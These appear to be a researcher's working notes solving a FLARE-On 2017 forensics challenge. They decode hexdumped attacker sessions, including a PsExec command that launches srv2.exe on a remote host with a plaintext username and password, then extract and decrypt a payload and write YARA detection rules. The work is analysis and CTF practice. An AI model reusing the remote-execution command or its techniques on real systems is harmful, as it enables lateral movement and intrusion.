+00000120: 30 20 63 6F 6E 66 69 67  2E 73 79 73 0D 0A 30 37  0 config.sys..07
+00000130: 2F 31 33 2F 32 30 30 39  20 20 30 37 3A 33 37 20  /13/2009  07:37
+00000140: 50 4D 20 20 20 20 3C 44  49 52 3E 20 20 20 20 20  PM    <DIR>
+00000150: 20 20 20 20 20 50 65 72  66 4C 6F 67 73 0D 0A 30       PerfLogs..0
+00000160: 32 2F 32 30 2F 32 30 31  33 20 20 30 35 3A 30 38  2/20/2013  05:08
+00000170: 20 50 4D 20 20 20 20 3C  44 49 52 3E 20 20 20 20   PM    <DIR>
+00000180: 20 20 20 20 20 20 50 72  6F 67 72 61 6D 20 46 69        Program Fi
+00000190: 6C 65 73 0D 0A 30 35 2F  32 35 2F 32 30 31 37 20  les..05/25/2017
+000001A0: 20 30 31 3A 30 33 20 50  4D 20 20 20 20 3C 44 49   01:03 PM    <DI
+000001B0: 52 3E 20 20 20 20 20 20  20 20 20 20 74 65 6D 70  R>          temp
+000001C0: 0D 0A 30 35 2F 32 34 2F  32 30 31 37 20 20 31 31  ..05/24/2017  11
+000001D0: 3A 34 35 20 41 4D 20 20  20 20 3C 44 49 52 3E 20  :45 AM    <DIR>
+000001E0: 20 20 20 20 20 20 20 20  20 55 73 65 72 73 0D 0A           Users..
+000001F0: 30 32 2F 32 30 2F 32 30  31 33 20 20 30 35 3A 31  02/20/2013  05:1
+00000200: 38 20 50 4D 20 20 20 20  3C 44 49 52 3E 20 20 20  8 PM    <DIR>
+00000210: 20 20 20 20 20 20 20 57  69 6E 64 6F 77 73 0D 0A         Windows..
+00000220: 30 35 2F 32 36 2F 32 30  31 33 20 20 30 38 3A 34  05/26/2013  08:4
+00000230: 31 20 41 4D 20 20 20 20  3C 44 49 52 3E 20 20 20  1 AM    <DIR>
+00000240: 20 20 20 20 20 20 20 77  6F 72 6B 0D 0A 20 20 20         work..
+00000250: 20 20 20 20 20 20 20 20  20 20 20 20 32 20 46 69              2 Fi
+00000260: 6C 65 28 73 29 20 20 20  20 20 20 20 20 20 20 20  le(s)
+00000270: 20 20 33 34 20 62 79 74  65 73 0D 0A 20 20 20 20    34 bytes..
+00000280: 20 20 20 20 20 20 20 20  20 20 20 36 20 44 69 72             6 Dir
+00000290: 28 73 29 20 20 35 35 2C  31 33 31 2C 31 31 39 2C  (s)  55,131,119,
+000002A0: 36 31 36 20 62 79 74 65  73 20 66 72 65 65 0D 0A  616 bytes free..
+000002B0: 0D 0A 63 3A 5C 3E                                 ..c:\>
+
+00000060: 62 76 2E 56 64 69 72 0D  0A 20 56 6F 6C 75 6D 65  bv.Vdir.. Volume
+00000070: 20 69 6E 20 64 72 69 76  65 20 43 20 68 61 73 20   in drive C has
+00000080: 6E 6F 20 6C 61 62 65 6C  2E 0D 0A 20 56 6F 6C 75  no label... Volu
+00000090: 6D 65 20 53 65 72 69 61  6C 20 4E 75 6D 62 65 72  me Serial Number
+000000A0: 20 69 73 20 45 43 41 41  2D 32 42 36 37 0D 0A 0D   is ECAA-2B67...
+000000B0: 0A 20 44 69 72 65 63 74  6F 72 79 20 6F 66 20 63  . Directory of c
+000000C0: 3A 5C 77 6F 72 6B 0D 0A  0D 0A 30 35 2F 32 36 2F  :\work....05/26/
+000000D0: 32 30 31 33 20 20 30 38  3A 34 31 20 41 4D 20 20  2013  08:41 AM
+000000E0: 20 20 3C 44 49 52 3E 20  20 20 20 20 20 20 20 20    <DIR>
+000000F0: 20 2E 0D 0A 30 35 2F 32  36 2F 32 30 31 33 20 20   ...05/26/2013
+00000100: 30 38 3A 34 31 20 41 4D  20 20 20 20 3C 44 49 52  08:41 AM    <DIR
+00000110: 3E 20 20 20 20 20 20 20  20 20 20 2E 2E 0D 0A 30  >          ....0
+00000120: 35 2F 32 36 2F 32 30 31  33 20 20 30 38 3A 33 36  5/26/2013  08:36
+00000130: 20 41 4D 20 20 20 20 3C  44 49 52 3E 20 20 20 20   AM    <DIR>
+00000140: 20 20 20 20 20 20 41 58  5F 43 6F 64 65 0D 0A 30        AX_Code..0
+00000150: 35 2F 32 36 2F 32 30 31  33 20 20 30 38 3A 33 37  5/26/2013  08:37
+00000160: 20 41 4D 20 20 20 20 3C  44 49 52 3E 20 20 20 20   AM    <DIR>
+00000170: 20 20 20 20 20 20 45 58  5F 43 6F 64 65 0D 0A 30        EX_Code..0
+00000180: 35 2F 32 36 2F 32 30 31  33 20 20 30 38 3A 34 30  5/26/2013  08:40
+00000190: 20 41 4D 20 20 20 20 3C  44 49 52 3E 20 20 20 20   AM    <DIR>
+000001A0: 20 20 20 20 20 20 46 6C  61 72 65 4F 6E 32 30 31        FlareOn201
+000001B0: 36 0D 0A 30 35 2F 32 36  2F 32 30 31 33 20 20 30  6..05/26/2013  0
+000001C0: 38 3A 33 37 20 41 4D 20  20 20 20 3C 44 49 52 3E  8:37 AM    <DIR>
+000001D0: 20 20 20 20 20 20 20 20  20 20 46 6C 61 72 65 4F            FlareO
+000001E0: 6E 32 30 31 37 0D 0A 30  35 2F 32 36 2F 32 30 31  n2017..05/26/201
+000001F0: 33 20 20 30 38 3A 34 31  20 41 4D 20 20 20 20 3C  3  08:41 AM    <
+00000200: 44 49 52 3E 20 20 20 20  20 20 20 20 20 20 48 58  DIR>          HX
+00000210: 5F 43 6F 64 65 0D 0A 30  35 2F 32 36 2F 32 30 31  _Code..05/26/201
+00000220: 33 20 20 30 38 3A 34 31  20 41 4D 20 20 20 20 3C  3  08:41 AM    <
+00000230: 44 49 52 3E 20 20 20 20  20 20 20 20 20 20 4D 61  DIR>          Ma
+00000240: 6C 77 61 72 65 0D 0A 30  35 2F 32 36 2F 32 30 31  lware..05/26/201
+00000250: 33 20 20 30 38 3A 34 30  20 41 4D 20 20 20 20 3C  3  08:40 AM    <
+00000260: 44 49 52 3E 20 20 20 20  20 20 20 20 20 20 4E 58  DIR>          NX
+00000270: 5F 43 6F 64 65 0D 0A 30  35 2F 32 36 2F 32 30 31  _Code..05/26/201
+00000280: 33 20 20 30 38 3A 33 37  20 41 4D 20 20 20 20 3C  3  08:37 AM    <
+00000290: 44 49 52 3E 20 20 20 20  20 20 20 20 20 20 52 53  DIR>          RS
+000002A0: 41 5F 66 61 63 74 6F 72  69 6E 67 0D 0A 20 20 20  A_factoring..
+000002B0: 20 20 20 20 20 20 20 20  20 20 20 20 30 20 46 69              0 Fi
+000002C0: 6C 65 28 73 29 20 20 20  20 20 20 20 20 20 20 20  le(s)
+000002D0: 20 20 20 30 20 62 79 74  65 73 0D 0A 20 20 20 20     0 bytes..
+000002E0: 20 20 20 20 20 20 20 20  20 20 31 30 20 44 69 72            10 Dir
+000002F0: 28 73 29 20 20 35 35 2C  31 33 31 2C 31 31 39 2C  (s)  55,131,119,
+00000300: 36 31 36 20 62 79 74 65  73 20 66 72 65 65 0D 0A  616 bytes free..
+00000310: 0D 0A 63 3A 5C 77 6F 72  6B 3E                    ..c:\work>
+
+00000060: 62 76 2E 56 63 64 20 63  3A 5C 77 6F 72 6B 5C 46  bv.Vcd c:\work\F
+00000070: 6C 61 72 65 4F 6E 32 30  31 37 0D 0A 0D 0A 63 3A  lareOn2017....c:
+00000080: 5C 77 6F 72 6B 5C 46 6C  61 72 65 4F 6E 32 30 31  \work\FlareOn201
+00000090: 37 3E                                             7>
+
+00000060: 62 76 2E 56 64 69 72 0D  0A 20 56 6F 6C 75 6D 65  bv.Vdir.. Volume
+00000070: 20 69 6E 20 64 72 69 76  65 20 43 20 68 61 73 20   in drive C has
+00000080: 6E 6F 20 6C 61 62 65 6C  2E 0D 0A 20 56 6F 6C 75  no label... Volu
+00000090: 6D 65 20 53 65 72 69 61  6C 20 4E 75 6D 62 65 72  me Serial Number
+000000A0: 20 69 73 20 45 43 41 41  2D 32 42 36 37 0D 0A 0D   is ECAA-2B67...
+000000B0: 0A 20 44 69 72 65 63 74  6F 72 79 20 6F 66 20 63  . Directory of c
+000000C0: 3A 5C 77 6F 72 6B 5C 46  6C 61 72 65 4F 6E 32 30  :\work\FlareOn20
+000000D0: 31 37 0D 0A 0D 0A 30 35  2F 32 36 2F 32 30 31 33  17....05/26/2013
+000000E0: 20 20 30 38 3A 33 37 20  41 4D 20 20 20 20 3C 44    08:37 AM    <D
+000000F0: 49 52 3E 20 20 20 20 20  20 20 20 20 20 2E 0D 0A  IR>          ...
+00000100: 30 35 2F 32 36 2F 32 30  31 33 20 20 30 38 3A 33  05/26/2013  08:3
+00000110: 37 20 41 4D 20 20 20 20  3C 44 49 52 3E 20 20 20  7 AM    <DIR>
+00000120: 20 20 20 20 20 20 20 2E  2E 0D 0A 30 35 2F 32 36         ....05/26
+00000130: 2F 32 30 31 33 20 20 30  38 3A 33 36 20 41 4D 20  /2013  08:36 AM
+00000140: 20 20 20 3C 44 49 52 3E  20 20 20 20 20 20 20 20     <DIR>
+00000150: 20 20 43 68 61 6C 6C 65  6E 67 65 5F 30 31 0D 0A    Challenge_01..
+00000160: 30 35 2F 32 36 2F 32 30  31 33 20 20 30 38 3A 33  05/26/2013  08:3
+00000170: 36 20 41 4D 20 20 20 20  3C 44 49 52 3E 20 20 20  6 AM    <DIR>
+00000180: 20 20 20 20 20 20 20 43  68 61 6C 6C 65 6E 67 65         Challenge
+00000190: 5F 30 32 0D 0A 30 35 2F  32 36 2F 32 30 31 33 20  _02..05/26/2013
+000001A0: 20 30 38 3A 33 36 20 41  4D 20 20 20 20 3C 44 49   08:36 AM    <DI
+000001B0: 52 3E 20 20 20 20 20 20  20 20 20 20 43 68 61 6C  R>          Chal
+000001C0: 6C 65 6E 67 65 5F 30 33  0D 0A 30 35 2F 32 36 2F  lenge_03..05/26/
+000001D0: 32 30 31 33 20 20 30 38  3A 33 36 20 41 4D 20 20  2013  08:36 AM
+000001E0: 20 20 3C 44 49 52 3E 20  20 20 20 20 20 20 20 20    <DIR>
+000001F0: 20 43 68 61 6C 6C 65 6E  67 65 5F 30 34 0D 0A 30   Challenge_04..0
+00000200: 35 2F 32 36 2F 32 30 31  33 20 20 30 38 3A 33 36  5/26/2013  08:36
+00000210: 20 41 4D 20 20 20 20 3C  44 49 52 3E 20 20 20 20   AM    <DIR>
+00000220: 20 20 20 20 20 20 43 68  61 6C 6C 65 6E 67 65 5F        Challenge_
+00000230: 30 35 0D 0A 30 35 2F 32  36 2F 32 30 31 33 20 20  05..05/26/2013
+00000240: 30 38 3A 33 36 20 41 4D  20 20 20 20 3C 44 49 52  08:36 AM    <DIR
+00000250: 3E 20 20 20 20 20 20 20  20 20 20 43 68 61 6C 6C  >          Chall
+00000260: 65 6E 67 65 5F 30 36 0D  0A 30 35 2F 32 36 2F 32  enge_06..05/26/2
+00000270: 30 31 33 20 20 30 38 3A  33 36 20 41 4D 20 20 20  013  08:36 AM
+00000280: 20 3C 44 49 52 3E 20 20  20 20 20 20 20 20 20 20   <DIR>
+00000290: 43 68 61 6C 6C 65 6E 67  65 5F 30 37 0D 0A 30 35  Challenge_07..05
+000002A0: 2F 32 36 2F 32 30 31 33  20 20 30 38 3A 33 36 20  /26/2013  08:36
+000002B0: 41 4D 20 20 20 20 3C 44  49 52 3E 20 20 20 20 20  AM    <DIR>
+000002C0: 20 20 20 20 20 43 68 61  6C 6C 65 6E 67 65 5F 30       Challenge_0
+000002D0: 38 0D 0A 30 35 2F 32 36  2F 32 30 31 33 20 20 30  8..05/26/2013  0
+000002E0: 38 3A 33 36 20 41 4D 20  20 20 20 3C 44 49 52 3E  8:36 AM    <DIR>
+000002F0: 20 20 20 20 20 20 20 20  20 20 43 68 61 6C 6C 65            Challe
+00000300: 6E 67 65 5F 30 39 0D 0A  30 35 2F 32 36 2F 32 30  nge_09..05/26/20
+00000310: 31 37 20 20 30 38 3A 34  36 20 41 4D 20 20 20 20  17  08:46 AM
+00000320: 3C 44 49 52 3E 20 20 20  20 20 20 20 20 20 20 43  <DIR>          C
+00000330: 68 61 6C 6C 65 6E 67 65  5F 31 30 0D 0A 30 35 2F  hallenge_10..05/
+00000340: 32 36 2F 32 30 31 33 20  20 30 38 3A 33 37 20 41  26/2013  08:37 A
+00000350: 4D 20 20 20 20 3C 44 49  52 3E 20 20 20 20 20 20  M    <DIR>
+00000360: 20 20 20 20 43 68 61 6C  6C 65 6E 67 65 5F 31 31      Challenge_11
+00000370: 0D 0A 30 35 2F 32 36 2F  32 30 31 33 20 20 30 38  ..05/26/2013  08
+00000380: 3A 33 37 20 41 4D 20 20  20 20 3C 44 49 52 3E 20  :37 AM    <DIR>
+00000390: 20 20 20 20 20 20 20 20  20 53 65 63 72 65 74 43           SecretC
+000003A0: 68 61 6C 6C 65 6E 67 65  5F 31 32 0D 0A 20 20 20  hallenge_12..
+000003B0: 20 20 20 20 20 20 20 20  20 20 20 20 30 20 46 69              0 Fi
+000003C0: 6C 65 28 73 29 20 20 20  20 20 20 20 20 20 20 20  le(s)
+000003D0: 20 20 20 30 20 62 79 74  65 73 0D 0A 20 20 20 20     0 bytes..
+000003E0: 20 20 20 20 20 20 20 20  20 20 31 34 20 44 69 72            14 Dir
+000003F0: 28 73 29 20 20 35 35 2C  31 33 31 2C 31 31 39 2C  (s)  55,131,119,
+00000400: 36 31 36 20 62 79 74 65  73 20 66 72 65 65 0D 0A  616 bytes free..
+00000410: 0D 0A 63 3A 5C 77 6F 72  6B 5C 46 6C 61 72 65 4F  ..c:\work\FlareO
+00000420: 6E 32 30 31 37 3E                                 n2017>
+
+Motherload
+
+>>> z = hexdump.restore(a)
+>>> for i in z.split('\r\n'): print(i)
+...
+bv.Vdir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\work\FlareOn2017
+
+05/26/2013  08:37 AM    <DIR>          .
+05/26/2013  08:37 AM    <DIR>          ..
+05/26/2013  08:36 AM    <DIR>          Challenge_01
+05/26/2013  08:36 AM    <DIR>          Challenge_02
+05/26/2013  08:36 AM    <DIR>          Challenge_03
+05/26/2013  08:36 AM    <DIR>          Challenge_04
+05/26/2013  08:36 AM    <DIR>          Challenge_05
+05/26/2013  08:36 AM    <DIR>          Challenge_06
+05/26/2013  08:36 AM    <DIR>          Challenge_07
+05/26/2013  08:36 AM    <DIR>          Challenge_08
+05/26/2013  08:36 AM    <DIR>          Challenge_09
+05/26/2017  08:46 AM    <DIR>          Challenge_10
+05/26/2013  08:37 AM    <DIR>          Challenge_11
+05/26/2013  08:37 AM    <DIR>          SecretChallenge_12
+               0 File(s)              0 bytes
+              14 Dir(s)  55,131,119,616 bytes free
+
+c:\work\FlareOn2017>
+
+00000060: 62 76 2E 56 63 64 20 63  3A 5C 77 6F 72 6B 5C 46  bv.Vcd c:\work\F
+00000070: 6C 61 72 65 4F 6E 32 30  31 37 5C 43 68 61 6C 6C  lareOn2017\Chall
+00000080: 65 6E 67 65 5F 31 30 0D  0A 0D 0A 63 3A 5C 77 6F  enge_10....c:\wo
+00000090: 72 6B 5C 46 6C 61 72 65  4F 6E 32 30 31 37 5C 43  rk\FlareOn2017\C
+000000A0: 68 61 6C 6C 65 6E 67 65  5F 31 30 3E              hallenge_10>
+
+00000060: 62 76 2E 56 64 69 72 0D  0A 20 56 6F 6C 75 6D 65  bv.Vdir.. Volume
+00000070: 20 69 6E 20 64 72 69 76  65 20 43 20 68 61 73 20   in drive C has
+00000080: 6E 6F 20 6C 61 62 65 6C  2E 0D 0A 20 56 6F 6C 75  no label... Volu
+00000090: 6D 65 20 53 65 72 69 61  6C 20 4E 75 6D 62 65 72  me Serial Number
+000000A0: 20 69 73 20 45 43 41 41  2D 32 42 36 37 0D 0A 0D   is ECAA-2B67...
+000000B0: 0A 20 44 69 72 65 63 74  6F 72 79 20 6F 66 20 63  . Directory of c
+000000C0: 3A 5C 77 6F 72 6B 5C 46  6C 61 72 65 4F 6E 32 30  :\work\FlareOn20
+000000D0: 31 37 5C 43 68 61 6C 6C  65 6E 67 65 5F 31 30 0D  17\Challenge_10.
+000000E0: 0A 0D 0A 30 35 2F 32 36  2F 32 30 31 37 20 20 30  ...05/26/2017  0
+000000F0: 38 3A 34 36 20 41 4D 20  20 20 20 3C 44 49 52 3E  8:46 AM    <DIR>
+00000100: 20 20 20 20 20 20 20 20  20 20 2E 0D 0A 30 35 2F            ...05/
+00000110: 32 36 2F 32 30 31 37 20  20 30 38 3A 34 36 20 41  26/2017  08:46 A
+00000120: 4D 20 20 20 20 3C 44 49  52 3E 20 20 20 20 20 20  M    <DIR>
+00000130: 20 20 20 20 2E 2E 0D 0A  30 35 2F 32 36 2F 32 30      ....05/26/20
+00000140: 31 37 20 20 30 38 3A 34  36 20 41 4D 20 20 20 20  17  08:46 AM
+00000150: 20 20 20 20 20 20 20 20  20 20 20 20 32 38 20 54              28 T
+00000160: 4F 44 4F 2E 74 78 74 0D  0A 20 20 20 20 20 20 20  ODO.txt..
+00000170: 20 20 20 20 20 20 20 20  31 20 46 69 6C 65 28 73          1 File(s
+00000180: 29 20 20 20 20 20 20 20  20 20 20 20 20 20 32 38  )             28
+00000190: 20 62 79 74 65 73 0D 0A  20 20 20 20 20 20 20 20   bytes..
+000001A0: 20 20 20 20 20 20 20 32  20 44 69 72 28 73 29 20         2 Dir(s)
+000001B0: 20 35 35 2C 31 33 31 2C  31 31 39 2C 36 31 36 20   55,131,119,616
+000001C0: 62 79 74 65 73 20 66 72  65 65 0D 0A 0D 0A 63 3A  bytes free....c:
+000001D0: 5C 77 6F 72 6B 5C 46 6C  61 72 65 4F 6E 32 30 31  \work\FlareOn201
+000001E0: 37 5C 43 68 61 6C 6C 65  6E 67 65 5F 31 30 3E     7\Challenge_10>
+
+>>> for i in hexdump.restore(a).split('\r\n'): print (i)
+...
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\work\FlareOn2017\Challenge_10
+
+05/26/2017  08:46 AM    <DIR>          .
+05/26/2017  08:46 AM    <DIR>          ..
+05/26/2017  08:46 AM                28 TODO.txt
+               1 File(s)             28 bytes
+               2 Dir(s)  55,131,119,616 bytes free
+
+c:\work\FlareOn2017\Challenge_10>
+
+00000060: 62 76 2E 56 70 73 65 2E  65 78 65 20 2D 68 0D 0A  bv.Vpse.exe -h..
+00000070: 0D 0A 50 73 45 78 65 63  20 76 32 2E 32 20 2D 20  ..PsExec v2.2 -
+00000080: 45 78 65 63 75 74 65 20  70 72 6F 63 65 73 73 65  Execute processe
+00000090: 73 20 72 65 6D 6F 74 65  6C 79 0D 0A 43 6F 70 79  s remotely..Copy
+000000A0: 72 69 67 68 74 20 28 43  29 20 32 30 30 31 2D 32  right (C) 2001-2
+000000B0: 30 31 36 20 4D 61 72 6B  20 52 75 73 73 69 6E 6F  016 Mark Russino
+00000170: 74 69 6F 6E 73 20 79 6F  75 0D 0A 65 78 65 63 75  tions you..execu
+00000180: 74 65 2C 20 6E 6F 74 20  50 73 45 78 65 63 2E 0D  te, not PsExec..
+00000190: 0A 0D 0A 0D 0A 63 3A 5C  73 74 61 67 69 6E 67 3E  .....c:\staging>
+
+00000060: 62 76 2E 56 70 73 65 2E  65 78 65 20 5C 5C 6C 61  bv.Vpse.exe \\la
+00000070: 72 72 79 6A 6F 68 6E 73  6F 6E 2D 70 63 20 2D 69  rryjohnson-pc -i
+00000080: 20 2D 63 20 2D 66 20 2D  64 20 2D 75 20 6C 61 72   -c -f -d -u lar
+00000090: 72 79 2E 6A 6F 68 6E 73  6F 6E 20 2D 70 20 6E 33  ry.johnson -p n3
+000000A0: 76 33 72 67 75 6E 6E 61  67 31 76 65 55 75 70 20  v3rgunnag1veUup
+000000B0: 2D 61 63 63 65 70 74 65  75 6C 61 20 73 72 76 32  -accepteula srv2
+000000C0: 2E 65 78 65 0D 0A                                 .exe..
+
+pse.exe \\larryjohnson-pc -i -c -f -d -u larry.johnson -p n3v3rgunnag1veUup -accepteula srv2.exe
+
+...
+Starting srv2.exe on larryjohnson-pc...johnson-pc...
+srv2.exe started on larryjohnson-pc with process ID 3000.
+
+c:\staging>
+
+00000070: 31 39 32 2E 31 36 38 2E  32 32 31 2E 31 30 35 00  192.168.221.105.
+
+THis is basically PgDn through thousands of lines of hex to see things interesting
+a/k/a - digital forensics in a nutshell
+
+00001F60: 36 B4 01 2A 31 B4 01 2A  31 B4 01 2A 33 B6 0C 2A  6..*1..*1..*3..*
+00001F70: 3E B0 0B 2A 3A B3 37 2A  26 AF 33 2A 22 A9 3E 2A  >..*:.7*&.3*".>*
+00001F80: 2F A4 3C 2A 29 A6 3B 2A  15 A7 39 2A 16 A2 27 2A  /.<*).;*..9*..'*
+00001F90: 13 9C 25 2A 1D 9F 20 2A  1E 99 2E 2A 1E 9A 2E 2A  ..%*.. *...*...*
+00001FA0: 1A 9B 2D 2A 07 95 28 2A  02 92 D7 2A 09 8D D3 2A  ..-*..(*...*...*
+00001FB0: 0A 88 DE 2A 77 8B DD 2A  70 86 DB 2A 72 80 C6 2A  ...*w..*p..*r..*
+
+Bitmap image data? for each dword, high bits stay the same low bits alter slightly.
+
+
+
+Extract out -- image? Bitmap sent across multiple sessions ...
+FlareOn2017_Challenge10
+Linux 64-bit Go binary. This should be super hard!
+Password is "infectedinfectedinfectedinfected919"
+
+extract cf.exe
+
+
+c:\\staging\\cf.exe lab10.zip tCqlc2+fFiLcuq1ee1eAPOMjxcdijh8z0jrakMA/jxg=
+
+So aES encrypted by un-base64d value of arg1
+
+
+lab10:
+13:30:07-bbaskin@~/CTF/FLARE_2017/12/extract$ unzip lab10.zip
+Archive:  lab10.z
+   creating: GoChallenge/
+   creating: GoChallenge/build/
+[lab10.zip] GoChallenge/build/challenge10 password:
+  inflating: GoChallenge/build/challenge10
+13:30:10-bbaskin@~/CTF/FLARE_2017/12/extract$
+
+File Name       : challenge10
+File Size       : 1,564,316
+CRC32           : 2aebadc8
+MD5             : 591e5d8bdb91e1d1e04463a372bf7102
+SHA1            : 48d8dc773f09af13d486fba0b4e56cef7791b550
+SHA256          : ce6f765339c307d76eb805b95d732190257927ec450b01bc37b3187f8cd5eae6
+Magic           : ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
+
+Wow, thank you. No reversing on that last one:
+
+
+'n3v3r_gunna_l3t_you_down_1987_4_ever@flare-on.com'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+==========================================================================================
+
+Also, let's cheat
+VT search: 02e90b48ba0be175d6b5768d1884a187
+First submission 2017-09-12 08:01:10
+Last submission 2017-09-30 05:34:03
+Number of submissions 19
+Distinct source submissions 2
+In-the-wild file names
+  coolprogram.exe
+  G:\virustemp\2017.09\09-15\2017.9.15\086.vir.exe
+  C:\Users\kve\Desktop\CTF\Flare-On4\lv12-[missing]\coolprogram.exe
+  C:\Users\lkhas\Desktop\M_Files\FLARE\LAST\coolprogram.exe
+
+2017-09-12 08:01:10  coolprogram.exe 0dad9a1e (web)  SG
+2017-09-13 22:54:00 dd1dafc141661d2dd5331de7fe61c8183c6ad...  f7ceafc0 (api)  US
+
+
+rule FLARE17_12_2nd
+/*
+.text:00401FBE C6 45 EC 32                       mov     [ebp+var_14], '2'
+.text:00401FC2 C6 45 ED 30                       mov     [ebp+var_13], '0'
+.text:00401FC6 C6 45 EE 31                       mov     [ebp+var_12], '1'
+.text:00401FCA C6 45 EF 37                       mov     [ebp+var_11], '7'
+.text:00401F4E 81 38 17 04 17 20                 cmp     dword ptr [eax], 20170417h
+*/
+{
+  strings:
+    $stackstrings = { C6 45 EC 32 C6 45 ED 30 C6 45 EE 31 C6 45 EF 37 }
+    $date_check = { 81 38 17 04 17 20 }
+  condition:
+    $stackstrings and $date_check
+}
+
+Job ID: bbaskinCb-1506821704
+Start time: Oct. 1, 2017, 4:09 a.m. UTC
+Finish time: Oct. 1, 2017, 7:44 a.m. UTC
+Scanned data size: 63486.1 GB
+Matches: 10
+
+Download matches from:
+https://www.virustotal.com/intelligence/hunting/retrohunt/matches/?job_id=bbaskinCb-1506821704
+FLARE17_12_2nd:02b1a09774cd2b4739348bf3b911fb6d9cc4f184f6aaa9ec52d52fc0717868b7/subfile
+FLARE17_12_2nd:ca5e5b03d3fe92e4d0656e5f5bcb8947d0a34065e82e37d0827480b8000d1c7e
+FLARE17_12_2nd:678a35b43da65cd40368e6eb3672b7a7e6fb8308c50cbb10fc385abed1ae9de7
+FLARE17_12_2nd:40aa35dff2b3fa2498e92d68c802995cc0c86b08011e347cd1c51413c5e1a337
+FLARE17_12_2nd:3fb59bae2f49c6bb9ecce8750dfc0b4dacebbee0f471a3be123a66ced7d96b05/subfile
+FLARE17_12_2nd:7c2662d484be4e05d1e7723f6042e8933a229e8f2865142e03ddfb8d60fe9225
+FLARE17_12_2nd:aca66fe0ce088240b42cc2be42e9c06c40d34c8123432c095b8f70248128cdd6
+FLARE17_12_2nd:33556b04675c8cd30315a0fd856d42de972b92ad299bf7fe9264ebe6608a468c
+FLARE17_12_2nd:49efc69654920fd1d2cb84b59fe6db98c3149154ee94ec0891ec11504d39af33
+FLARE17_12_2nd:6b71f74447eec8f6f864a345ec043b20a4efcd7a3043d28c1c2b8a77c3fb7a5e
+
+cstagingsrv2.exe (bf0a86db982de1996c0dc49d681dbe81):
+  c168403b (web) IN
+  b378aed6 (web) SE
+phase2.exe (5607a94d60756d7b62d47016b8c75bc7):
+  d5ab6621 (web) VN
+stage2.exe (64bacf782c2d3971dc3084d724684def):
+  df2c3bc8 (web)  VN
+secondstage.exe:
+  b13d96bf (api)  DE
+  dca1801b (web)  FR
+C:\Users\kve\Desktop\CTF\Flare-On4\lv12-[missing]\New folder\stage2.exe.bin  (6f53a0ed92c00f3e6fc83e0da28aaf19)
+  e86a449b (web)  IT
+  161375ba (web)  UA
+2017.9.29.zip (aa409b87c91b0b04df31058de3649d82) <<<<< interesting, will get all in one zip?
+  e63eec78 (web)  CN
+secondstage.dll:
+  161375ba (web)  UA
+
+
+rule FLARE17_12_2nd
+/*
+.text:00401FBE C6 45 EC 32                       mov     [ebp+var_14], '2'
+.text:00401FC2 C6 45 ED 30                       mov     [ebp+var_13], '0'
+.text:00401FC6 C6 45 EE 31                       mov     [ebp+var_12], '1'
+.text:00401FCA C6 45 EF 37                       mov     [ebp+var_11], '7'
+.text:00401F4E 81 38 17 04 17 20                 cmp     dword ptr [eax], 20170417h
+*/
+
+{
+  strings:
+    $stackstrings = { C6 45 EC 32 C6 45 ED 30 C6 45 EE 31 C6 45 EF 37 }
+    $date_check = { 81 38 17 04 17 20 }
+  condition:
+    $stackstrings and $date_check
+}
+
+
+rule FLARE17_12_3rd
+/*
+00000880: 2e2e 2e2e 2e20 2053 4841 2d31 2074 6573  .....  SHA-1 tes
+00000890: 7420 2325 643a 202e 2e66 6169 6c65 640a  t #%d: ..failed.
+*/
+
+{
+  strings:
+    $string1 = "SHA-1 test #%d:"
+    $string2 = "passed"
+    $string3 = "CreateFileW"
+    $string4 = "WriteConsoleW"
+    $string5 = "failed"
+      condition:
+    all of them and uint16(0) == 0x5A4D
+}
+
+
